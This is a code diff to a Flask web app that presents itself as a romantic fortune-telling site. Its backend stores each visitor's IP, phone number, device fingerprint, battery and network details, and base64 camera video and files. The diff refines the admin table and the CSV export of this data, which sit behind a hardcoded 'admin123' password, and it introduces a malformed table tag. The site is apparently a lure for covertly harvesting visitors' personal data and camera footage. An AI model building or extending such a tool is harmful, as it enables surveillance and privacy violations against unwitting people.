@@ -6,7 +6,6 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# 32 romantic fortunes
 FORTUNES = [
     "Your soulmate is thinking of you right now 💕",
     "A passionate kiss awaits you this week 😘",
@@ -44,7 +43,7 @@ FORTUNES = [
 
 DATA_FILE = 'visitors.json'
 
-# All possible fields – ensures admin table shows every column
+# ALL POSSIBLE FIELDS – admin table will ALWAYS show these columns
 ALL_FIELDS = [
     'sessionId', 'timestamp', 'ip', 'name', 'fortuneText', 'phoneNumber',
     'fingerprint', 'batteryLevel', 'batteryCharging', 'networkType', 'networkSpeed',
@@ -117,7 +116,7 @@ def save():
     data = request.json
     data['timestamp'] = datetime.now().isoformat()
     data['ip'] = request.remote_addr
-    # Ensure all fields exist (fill missing with empty string)
+    # Ensure every field in ALL_FIELDS exists (fill with empty string if missing)
     for field in ALL_FIELDS:
         if field not in data:
             data[field] = ''
@@ -152,13 +151,17 @@ def admin():
             visitors = get_visitors()
             if not visitors:
                 return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
+            # Build table using ALL_FIELDS as header – ALL columns always visible
             html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
             html += '<table border="1" cellpadding="5">'
-            html += '<tr>' + ''.join(f'<th>{field}</th>' for field in ALL_FIELDS) + '</tr>'
+            html += '<tr>' + ''.join(f'<th>{field}</th>' for field in ALL_FIELDS) + '<tr>'
             for v in visitors:
                 html += '<tr>'
                 for field in ALL_FIELDS:
                     val = v.get(field, '')
+                    # Truncate long base64 for display
+                    if field in ('cameraVideo', 'files') and len(str(val)) > 100:
+                        val = str(val)[:100] + '…'
                     html += f'<td>{str(val)[:100]}</td>'
                 html += '</tr>'
             html += '</table>'
@@ -201,10 +204,15 @@ def download_csv():
     import csv
     from io import StringIO
     output = StringIO()
-    writer = csv.writer(output)
+    # Use quoting to handle commas and newlines inside base64 strings
+    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
     writer.writerow(ALL_FIELDS)
     for v in visitors:
-        row = [v.get(field, '') for field in ALL_FIELDS]
+        row = []
+        for field in ALL_FIELDS:
+            val = v.get(field, '')
+            # Convert to string and sanitise for CSV (no newlines)
+            row.append(str(val).replace('\n', ' ').replace('\r', ' '))
         writer.writerow(row)
     
     return Response(
